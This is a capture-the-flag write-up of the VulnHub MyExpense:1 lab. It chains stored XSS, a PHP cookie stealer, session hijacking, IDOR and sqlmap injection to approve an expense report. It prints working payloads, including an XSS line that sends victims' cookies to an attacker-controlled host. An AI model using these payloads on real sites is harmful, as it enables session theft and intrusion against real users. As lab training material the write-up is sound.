# 🖥️ MyExpense:1 — VulnHub

| Field | Details |
|---|---|
| 🏷️ Machine | MyExpense:1 |
| 🌐 Platform | VulnHub |
| 🎯 Difficulty | Medium |
| 🧠 Topics | XSS, Cookie Stealing, IDOR, SQL Injection, Session Hijacking |
| 👤 Author | [Sandeep Prasad Chowdhury](https://github.com/chowdhurysandeep) |
| 🔗 Source | https://www.vulnhub.com/entry/myexpense-1,405/ |

---

## 📌 Summary

MyExpense:1 is a web application pentesting challenge. The goal is to validate a 750€ expense report belonging to Samuel Lamotte. The attack chain involves stored XSS to steal admin cookies, IDOR to reactivate a disabled account, chaining XSS again to hijack the manager's session, and finally SQLi to dump hashes and escalate to the financial approver.

---

## 🧩 Scenario

You are **Samuel Lamotte**, recently fired from "Futura Business Informatique". You need your 750€ expense report approved. Credentials from VulnHub: `samuel / fzghn4lw`

---

## 🔍 1. Reconnaissance & Enumeration

### Network Discovery

```bash
netdiscover
```

Target IP: **<TARGET_IP>**

### Port Scan

```bash
nmap -sCV <TARGET_IP>
```

Port 80 open — Apache 2.4.25, MyExpense web app running.

### Directory Enumeration

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/dirb/wordlists/big.txt
```

- `robots.txt` → reveals `Disallow: /admin/admin.php`
- `admin/admin.php` → shows all user accounts — Samuel's is **Inactive**

---

## 💥 2. Exploitation

### Step 1 — Confirm XSS on Signup Page

The signup form firstname/lastname fields are vulnerable to stored XSS. The submit button is disabled — bypass via DevTools (remove `disabled=""` from the button).

Test payload:
```html
<script>alert("1")</script>
```

Visiting `admin/admin.php` triggers the popup — **XSS confirmed** ✅

---

### Step 2 — Cookie Stealing (Hijack Admin Session)

Create a PHP cookie stealer on Kali:

```bash
cd /var/www/html
nano cookiestealer.php
```

```php
<?php
header('Location:https://google.com');
$cookie = $_GET['cmd'];
$file = fopen('log.txt', 'a');
fwrite($file, $cookie . "\n\n");
?>
```

Run PHP server:

```bash
service apache2 stop
php -S <KALI_IP>:80
```

Inject via signup form (firstname field):

```html
<script>document.write('<img src="http://<KALI_IP>/cookiestealer.php?cmd='+document.cookie+'" />');</script>
```

Admin's PHPSESSID appears in `log.txt`. Now use the **Cookie Editor** browser extension to replace your session:

1. Open Firefox → click the **Cookie Editor** extension icon
2. Find the `PHPSESSID` cookie
3. Click the **edit (pencil)** icon next to it
4. Replace the **Value** field with the captured admin cookie value from `log.txt`
5. Click **Save**
6. Refresh `http://<TARGET_IP>/admin/admin.php`

✅ **Admin access obtained** — you are now browsing as the administrator

---

### Step 3 — Activate Samuel's Account (IDOR)

Create another account with this firstname payload:

```html
<script>document.write('<img src=http://<TARGET_IP>/admin/admin.php?id=11&status=active" />');</script>
```

Admin session silently activates Samuel's account (ID=11).

✅ **Samuel's account reactivated**

Login: `slamotte / fzghn4lw`

---

### Step 4 — Submit Expense Report

Go to **Expense Reports** → submit the 750€ report. Status: **Submitted**.

From Samuel's profile: Manager = **Manon Riviere** (`mriviere`)

---

### Step 5 — Hijack Manager Session

Post XSS cookie stealer in the messaging/comment box:

```html
<script>document.write('<img src="http://<KALI_IP>/cookiestealer.php?cmd='+document.cookie+'" />');</script>
```

Capture Manon's cookie from `log.txt`. Follow the same Cookie Editor steps:

1. Open **Cookie Editor** extension
2. Edit `PHPSESSID` value → paste Manon's captured cookie
3. Click **Save** → refresh the page

✅ **Logged in as Manon Riviere (Manager)**

Validate Samuel's expense report. Status: **Validated**

---

### Step 6 — SQL Injection → Financial Approver

The Rennes office page (`site.php?id=2`) is vulnerable to SQLi:

```bash
sqlmap -u "http://<TARGET_IP>/site.php?id=2" \
  --headers="User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:25.0)" \
  --cookie="PHPSESSID=<manon_session>"
```

Dump the user table:

```bash
sqlmap -u "http://<TARGET_IP>/site.php?id=2" \
  --cookie="PHPSESSID=<manon_session>" \
  --dump -D myexpense -T user
```

**Hash for pbaudouin:** `64202ddd5fdea4cc5c2f856efef36e1a`

Crack at CrackStation → **Password: `HackMe`**

---

### Step 7 — Approve as Financial Approver

Login: `pbaudouin / HackMe`

Navigate to expenses → send Samuel's report for payment.

Status: **Sent for payment** ✅

---

## 🚩 3. Flag

Log back into Samuel (`slamotte / fzghn4lw`) → check expense tab:

```
Congratz! The flag is: flag{H4CKY0URL1F3}
```

---

## 📚 4. Lessons Learned

- Stored XSS in admin-viewed fields leads to full session hijacking
- Disabled HTML buttons are client-side only — always interceptable
- IDOR with no server-side authorization allows account manipulation
- Internal pages can have SQLi — always test all parameters
- MD5 passwords are instantly crackable via CrackStation

---

## 🛠️ Tools Used

- `netdiscover`, `nmap`, `gobuster`
- Cookie Editor (browser extension)
- `sqlmap` — SQL injection
- CrackStation — MD5 cracking
- PHP built-in server — cookie stealer

---

*Writeup by [Sandeep Prasad Chowdhury](https://github.com/chowdhurysandeep) — for educational purposes only.*
